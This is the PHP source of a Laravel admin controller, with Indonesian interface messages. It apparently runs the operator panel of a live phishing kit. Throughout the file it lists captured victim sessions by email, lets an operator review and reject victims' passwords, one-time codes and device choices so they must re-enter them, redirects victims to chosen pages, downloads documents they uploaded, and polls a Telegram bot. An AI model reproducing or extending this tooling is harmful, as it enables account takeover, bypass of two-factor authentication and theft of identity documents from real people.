<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\AccessSession;
use App\Models\Setting;
use App\Services\TelegramService;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\View\View;
use Symfony\Component\HttpFoundation\StreamedResponse;

class AccessController extends Controller
{
    public function index(TelegramService $telegram): View
    {
        $this->pollTelegramIfNeeded($telegram);

        $sessions = AccessSession::query()
            ->where('status', '!=', AccessSession::STATUS_LOGIN)
            ->where('email', '!=', '')
            ->orderByRaw("CASE
                WHEN status IN ('otp_review', 'auth_review', 'password_review', 'device_review') THEN 0
                WHEN status = 'waiting' THEN 1
                WHEN status IN ('logout', 'closed') THEN 3
                ELSE 2
            END")
            ->orderByDesc('created_at')
            ->paginate(50);

        $activeCount = AccessSession::query()
            ->whereNotIn('status', [
                AccessSession::STATUS_CLOSED,
                AccessSession::STATUS_LOGOUT,
                AccessSession::STATUS_LOGIN,
            ])
            ->where('email', '!=', '')
            ->count();

        return view('admin.access', [
            'sessions' => $sessions,
            'pages' => AccessSession::PAGES,
            'activeCount' => $activeCount,
            'totalCount' => AccessSession::query()
                ->where('status', '!=', AccessSession::STATUS_LOGIN)
                ->where('email', '!=', '')
                ->count(),
        ]);
    }

    public function send(Request $request, AccessSession $accessSession, string $page): RedirectResponse
    {
        if (! array_key_exists($page, AccessSession::PAGES)) {
            return back()->withErrors(['page' => 'Halaman tidak valid.']);
        }

        if (in_array($accessSession->status, [
            AccessSession::STATUS_CLOSED,
            AccessSession::STATUS_LOGOUT,
        ], true)) {
            return back()->withErrors(['page' => 'Session sudah ditutup.']);
        }

        $extra = [];

        if ($page === AccessSession::STATUS_OTP) {
            $digits = trim((string) $request->input('phone_last4', ''));

            if ($digits === '' && $accessSession->hasPhoneLast4()) {
                $digits = (string) $accessSession->phone_last4;
            }

            if (! preg_match('/^\d{4}$/', $digits)) {
                return back()->withErrors(['page' => 'Isi 4 digit terakhir nomor telepon (hanya pertama kali).']);
            }

            $extra['phone_last4'] = $digits;
        }

        $accessSession->sendTo($page, $extra);

        return back()->with('status', 'User diarahkan ke '.$page);
    }

    public function declineOtp(AccessSession $accessSession): RedirectResponse
    {
        if (! $accessSession->isReview()) {
            return back()->withErrors(['otp' => 'Tidak ada kode yang menunggu review.']);
        }

        $accessSession->declineOtp();

        return back()->with('status', 'Kode ditolak. User harus input lagi.');
    }

    public function declinePassword(AccessSession $accessSession): RedirectResponse
    {
        if ($accessSession->status !== AccessSession::STATUS_PASSWORD_REVIEW) {
            return back()->withErrors(['password' => 'Tidak ada password retry yang menunggu.']);
        }

        $accessSession->declinePassword();

        return back()->with('status', 'Password ditolak. User harus input lagi.');
    }

    public function declineDevice(AccessSession $accessSession): RedirectResponse
    {
        if ($accessSession->status !== AccessSession::STATUS_DEVICE_REVIEW) {
            return back()->withErrors(['device' => 'Tidak ada pilihan device yang menunggu.']);
        }

        $accessSession->declineDevice();

        return back()->with('status', 'Pilihan device ditolak. User harus pilih lagi.');
    }

    public function downloadDocument(AccessSession $accessSession): StreamedResponse|RedirectResponse
    {
        if (! $accessSession->hasDocument() || ! Storage::disk('local')->exists($accessSession->document_path)) {
            return back()->withErrors(['document' => 'Dokumen tidak ditemukan.']);
        }

        return Storage::disk('local')->download(
            $accessSession->document_path,
            $accessSession->document_original_name ?: basename($accessSession->document_path)
        );
    }

    public function close(AccessSession $accessSession): RedirectResponse
    {
        $accessSession->forceFill([
            'status' => AccessSession::STATUS_LOGOUT,
            'redirected_at' => now(),
        ])->save();

        return back()->with('status', 'Session ditutup. User akan logout otomatis.');
    }

    public function clear(): RedirectResponse
    {
        $sessions = AccessSession::query()
            ->where('status', '!=', AccessSession::STATUS_LOGIN)
            ->where('email', '!=', '')
            ->get();

        foreach ($sessions as $session) {
            if ($session->document_path && Storage::disk('local')->exists($session->document_path)) {
                Storage::disk('local')->delete($session->document_path);
            }
        }

        $deleted = AccessSession::query()
            ->where('status', '!=', AccessSession::STATUS_LOGIN)
            ->where('email', '!=', '')
            ->delete();

        return back()->with('status', "Semua access session dihapus ({$deleted}).");
    }

    protected function pollTelegramIfNeeded(TelegramService $telegram): void
    {
        if (! filled(Setting::get('telegram_bot_token'))) {
            return;
        }

        $webhook = $telegram->webhookInfo();
        if (filled($webhook['url'] ?? null)) {
            return;
        }

        try {
            $telegram->pollUpdatesOnce(0);
        } catch (\Throwable) {
            //
        }
    }
}
